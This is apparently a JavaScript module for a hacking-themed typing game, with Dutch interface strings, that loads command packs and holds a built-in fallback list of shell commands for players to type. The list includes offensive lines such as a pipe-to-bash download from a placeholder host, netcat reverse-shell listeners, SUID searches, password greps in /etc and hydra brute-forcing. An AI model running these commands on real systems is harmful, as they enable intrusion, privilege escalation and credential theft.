const FALLBACK_COMMANDS = [
  'ls',
  'pwd',
  'cd',
  'clear',
  'whoami',
  'id',
  'hostname',
  'uname -a',
  'date',
  'uptime',
  'ifconfig',
  'ip a',
  'ip route',
  'ping -c 1 8.8.8.8',
  'traceroute 8.8.8.8',
  'netstat -tulpn',
  'ss -tulwn',
  'ps aux',
  'top',
  'htop',
  'journalctl -xe',
  'dmesg | tail',
  'tail -f /var/log/auth.log',
  'grep -R "password" /etc',
  'find / -perm -4000',
  'locate shadow',
  'chmod +x exploit.sh',
  'chown root:root /bin/bash',
  'ln -s /bin/sh /tmp/sh',
  'tar -czvf backup.tar.gz /var/www',
  'gzip -d logs.gz',
  'scp file.txt user@10.0.0.5:/tmp/',
  'ssh user@10.0.0.5',
  'rsync -avz . user@host:/srv/',
  'curl -s http://10.10.10.10',
  'wget http://example.com/shell.sh',
  'python3 -m http.server 8000',
  'nc -lvnp 4444',
  'rlwrap nc -lvnp 4444',
  'socat TCP-LISTEN:4444,reuseaddr,fork TCP:10.0.0.1:4444',
  'ssh -L 8080:localhost:80 user@10.0.0.5',
  'proxychains nmap -sT 10.10.10.10',
  'nmap -sC -sV 10.10.10.10',
  'sudo nmap 10.10.15.100 -sV -sC -p- -v -Pn',
  'hydra -l admin -P rockyou.txt 10.0.0.5 ssh',
  'gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt',
  'feroxbuster -u http://target -w wordlist.txt',
  'sqlmap -u "http://target/id=1" --batch',
  'msfconsole -q -x "use exploit/multi/handler"',
  'wget -qO- http://10.10.10.10/shell.sh | bash'
];

function unique(array) {
  return Array.from(new Set(array.filter(Boolean)));
}

function normaliseCommand(entry, index) {
  if (!entry) {
    return null;
  }
  const command = String(entry.command ?? entry).trim();
  if (!command) {
    return null;
  }

  const accepted = unique([command, ...(entry.accepted_variants ?? [])]
    .map((value) => String(value).trim())
    .filter(Boolean));
  const tags = unique((entry.tags ?? []).map((tag) => String(tag).trim().toLowerCase()));

  return {
    id: entry.id ?? `cmd-${index}`,
    command,
    description: entry.description ?? 'Geen beschrijving aanwezig.',
    description_long: entry.description_long ?? null,
    mock_output: entry.mock_output ?? '',
    accepted_variants: accepted,
    tags
  };
}

function normalisePack(raw, fallbackId = 'pack') {
  if (!raw || typeof raw !== 'object') {
    throw new Error('Ongeldige pack data.');
  }

  const commands = Array.isArray(raw.commands)
    ? raw.commands.map(normaliseCommand).filter(Boolean)
    : [];

  if (!commands.length) {
    throw new Error('Pack bevat geen commando\'s.');
  }

  return {
    packId: raw.packId ?? fallbackId,
    title: raw.title ?? 'Command Pack',
    summary: raw.summary ?? 'Snelle typcommando\'s voor de HackType run.',
    difficulty: raw.difficulty ?? 'mixed',
    commands
  };
}

export async function loadPack(packId = 'beginner') {
  const response = await fetch(`content/packs/${packId}.json`, { cache: 'no-store' });
  if (!response.ok) {
    throw new Error(`Kan pack ${packId} niet laden (${response.status}).`);
  }
  const json = await response.json();
  return normalisePack(json, packId);
}

export function createFallbackPack(packId = 'fallback') {
  const commands = FALLBACK_COMMANDS.map((command, index) => ({
    id: `fallback-${index}`,
    command,
    description: 'Fallback commando uit de ingebakken woordenlijst.',
    mock_output: '',
    accepted_variants: [command],
    tags: []
  }));

  return {
    packId,
    title: 'Fallback Ops',
    summary: 'Ingebakken reeks commandoregels voor als het pack niet laadt.',
    difficulty: 'mixed',
    commands
  };
}
